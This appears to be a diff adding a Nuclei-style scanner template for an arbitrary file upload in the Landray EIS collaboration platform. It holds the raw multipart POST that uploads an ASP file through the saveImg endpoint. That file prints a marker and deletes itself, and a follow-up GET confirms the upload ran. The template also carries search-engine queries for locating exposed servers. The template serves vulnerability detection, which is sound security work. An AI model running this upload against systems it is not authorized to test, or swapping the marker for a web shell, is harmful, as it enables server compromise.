@@ -1,0 +1,61 @@
+http:
+    - extractors:
+        - dsl:
+            - body_1
+          internal: true
+          name: path
+          type: dsl
+      matchers:
+        - part: status_code_1
+          status:
+            - 200
+          type: status
+        - condition: and
+          part: body_1
+          type: word
+          words:
+            - /files/editor_img
+        - part: status_code_2
+          status:
+            - 200
+          type: status
+        - condition: and
+          part: body_2
+          type: word
+          words:
+            - e165421110ba03099a1c0393373c5b43
+      matchers-condition: and
+      raw:
+        - |
+          POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+          ------WebKitFormBoundary{{rboundary}}
+          Content-Disposition: form-data; name="file"filename="{{randstr}}.asp"
+          Content-Type: text/html
+
+          <%
+            Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51)
+            CreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME")))
+          %>
+          ------WebKitFormBoundary{{rboundary}}--
+        - |
+          GET {{path}} HTTP/1.1
+          Host: {{Hostname}}
+id: landray-eis-saveimg-fileupload
+info:
+    author: zan8in
+    description: |-
+        FOFA: icon_hash="953405444"
+        ZoomEye: app:"蓝凌EIS智慧协同平台"
+    name: 蓝凌EIS智慧协同平台任意文件上传
+    severity: critical
+    tags:
+        - landray
+        - fileupload
+        - 蓝凌EIS智慧协同平台
+        - 蓝凌eis智慧协同平台
+variables:
+    randstr: '{{rand_base(5)}}'
+    rboundary: '{{rand_base(8)}}'
